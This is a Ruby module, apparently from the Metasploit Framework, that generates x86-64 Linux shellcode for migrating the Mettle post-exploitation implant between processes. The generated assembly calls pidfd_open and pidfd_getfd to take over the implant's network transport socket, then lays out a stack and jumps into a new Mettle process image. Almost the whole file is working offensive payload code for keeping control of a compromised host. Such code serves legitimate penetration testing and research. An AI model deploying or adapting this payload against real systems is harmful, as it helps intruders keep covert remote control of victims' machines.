# -*- coding: binary -*-
# frozen_string_literal: true

require 'rex/elfparsey'

module Msf
  # Payload that supports socket-preserving migrations on x64.
  module Payload::Linux::X64::MigrateTcp
    include Msf::Payload::Linux::X64::Migrate

    #
    # Duplicates the source Mettle transport and starts a Mettle process image.
    #
    def generate_migrate(opts = {})
      entry_offset = elf_entry_point(opts.fetch(:payload))

      %(
      pop rdi                    ; source Mettle pid
      xor esi, esi
      mov eax, 434               ; pidfd_open(pid, 0)
      syscall
      test eax, eax
      js migrate_failed

      pop rsi                    ; source transport fd
      mov rdi, rax               ; source Mettle pidfd
      xor edx, edx
      mov eax, 438               ; pidfd_getfd(pidfd, fd, 0)
      syscall
      test eax, eax
      js migrate_failed

      mov rdi, rax               ; duplicated transport fd
      pop rsi                    ; process image address

      and rsp, -16
      add rsp, 128
      mov eax, 0x6d              ; argv[0] = "m"
      push rax
      mov rcx, rsp

      xor ebx, ebx
      push rbx                   ; AT_NULL value
      push rbx                   ; AT_NULL type
      push rsi                   ; AT_BASE value
      push 7                     ; AT_BASE type
      push rbx                   ; envp terminator
      push rbx                   ; argv terminator
      push rdi                   ; argv[1] = transport fd
      push rcx                   ; argv[0]
      push 2                     ; argc

      add rsi, #{entry_offset}
      jmp rsi

    migrate_failed:
      mov eax, 60                ; exit(1)
      mov edi, 1
      syscall
    )
    end

    private

    def elf_entry_point(payload)
      Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload)).elf_header.e_entry
    end
  end
end
